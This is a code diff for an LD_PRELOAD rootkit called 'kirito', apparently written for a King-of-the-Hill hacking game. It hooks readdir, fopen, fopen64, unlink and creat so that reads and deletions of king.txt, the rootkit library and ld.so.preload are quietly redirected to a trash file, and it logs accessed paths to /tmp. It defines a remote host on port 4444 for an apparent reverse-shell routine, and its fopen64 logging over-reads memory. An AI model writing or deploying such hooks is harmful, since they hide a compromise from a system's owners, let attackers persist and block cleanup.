@@ -1,3 +1,5 @@
+//kirito written by TERRAMINATOR
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <unistd.h>
@@ -15,6 +17,11 @@
 #define REM_HOST4 "10.8.41.76"
 #define REM_PORT 4444
 #define LOC_PORT 65065
+#define trash "/tmp/kirtrash"
+
+typedef int bool;
+#define true 1
+#define false 0
 
 int ipv4_rev (void)
 {
@@ -47,6 +54,32 @@ int ipv4_rev (void)
     return 0;
 }
 
+
+bool is_protected(const char* path) {
+        if(strstr(path, "king.txt") != NULL) {
+                return(true);
+        }
+        else if(strstr(path, "libc.kir.so.6") != NULL) {
+                return(true);
+        }
+        else if(strstr(path, "ld.so.preload") != NULL) {
+                return(true);
+        }
+	else {
+		return(false);
+	}
+}
+
+
+void log_(const char* msg, char* path) {
+        FILE* fd;
+        fd  = fopen(path, "a+");
+        fputs(msg, fd);
+	fputs("\n", fd);
+        fclose(fd);
+}
+
+
 struct dirent *(*old_readdir)(DIR *dir);
 struct dirent *readdir(DIR *dirp)
 {
@@ -62,6 +95,7 @@ struct dirent *readdir(DIR *dirp)
     }
     return dir;
 }
+
 
 struct dirent64 *(*old_readdir64)(DIR *dir);
 struct dirent64 *readdir64(DIR *dirp)
@@ -79,40 +113,65 @@ struct dirent64 *readdir64(DIR *dirp)
     return dir;
 }
 
+
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
 {
 	FILE *fp;
-	char * trash = "kirtrash";
 	orig_fopen = dlsym(RTLD_NEXT, "fopen");
-        if(strstr(pathname, "king.txt")) {
-                 pathname = trash;
-        }
-        else if(strstr(pathname, "libc.kir.so.6")) {
-                 pathname = trash;
-        }
-        else if(strstr(pathname, "ld.so.preload")) {
-                 pathname = trash;
-        }
+	if(is_protected(pathname)) {
+		pathname = trash;
+	}
 	fp = orig_fopen(pathname, mode);
 	return(fp);
 }
+
 
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 FILE *fopen64(const char *pathname, const char *mode)
 {
 	FILE* fp;
-	char * trash = "kirtrash";
 	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
-        if(strcmp(pathname, "king.txt")) {
-                 pathname = trash;
+        if(is_protected(pathname)) {
+                pathname = trash;
         }
-        else if(strcmp(pathname, "libc.kir.so.6") == 0) {
-                 pathname = trash;
-        }
-        else if(strcmp(pathname, "ld.so.preload") == 0) {
-                 pathname = trash;
-        }
+	FILE* fd;
+	fd  = orig_fopen64("/tmp/fopen64.log", "a+");
+	fwrite(pathname, 1, sizeof(pathname)+50, fd);
+	fclose(fd);
         fp = orig_fopen64(pathname, mode);
         return(fp);
+}
+
+
+int (*orig_unlink)(const char *path);
+int unlink(const char *path) {
+	orig_unlink = dlsym(RTLD_NEXT, "unlink");
+        if(is_protected(path)) {
+                path = trash;
+        }
+        log_(path, "/tmp/unlink.log");
+	int res = orig_unlink(path);
+	return(res);
+}
+
+
+//int (*orig_open)(const char *pathname, int flags, unsigned int mode);
+//int open(const char *pathname, int flags, unsigned int mode) {
+//	orig_open = dlsym(RTLD_NEXT, "open");
+//	if(is_protected(pathname)) {
+//              pathname = trash;
+//      }
+//      log_(pathname, "/tmp/open.log");
+//	int fp = orig_open(pathname, flags, mode);
+//	return(fp);
+//}
+
+
+int (*orig_creat)(const char *pathname, mode_t mode);
+int creat(const char *pathname, mode_t mode) {
+	orig_creat = dlsym(RTLD_NEXT, "creat");
+	log_(pathname, "/tmp/create.log");
+	int res = orig_creat(pathname, mode);
+	return(res);
 }
